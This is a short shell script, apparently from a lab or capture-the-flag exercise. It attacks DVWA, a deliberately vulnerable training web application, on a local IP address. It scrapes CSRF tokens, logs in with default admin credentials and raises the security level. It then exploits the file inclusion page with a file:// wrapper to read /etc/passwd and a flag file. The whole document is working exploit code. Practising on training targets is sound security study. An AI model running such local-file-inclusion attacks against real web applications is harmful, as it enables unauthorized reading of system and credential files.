#Login with the known details
CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&user_token=${CSRF}" 192.168.178.98/dvwa/login.php > /dev/null
#Change the security level to high (impossible by default)
CSRFSEC=$(curl -s -i -L -c dvwa.cookie.high -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONIDSEC=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie.high -c dvwa.cookie.high -d $"security=high&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
#Check out the "File injection" page
curl -s -i -L -b dvwa.cookie.high 192.168.178.98/dvwa/vulnerabilities/fi/ > /dev/null
#file:// wrapper still works, others are scrubbed
curl -s -L -b dvwa.cookie.high 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "file:///etc/passwd") > passwd
curl -s -L -b dvwa.cookie.high 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "file:///var/www/html/dvwa/hackable/flags/fi.php") > hackable
rm -f dvwa*
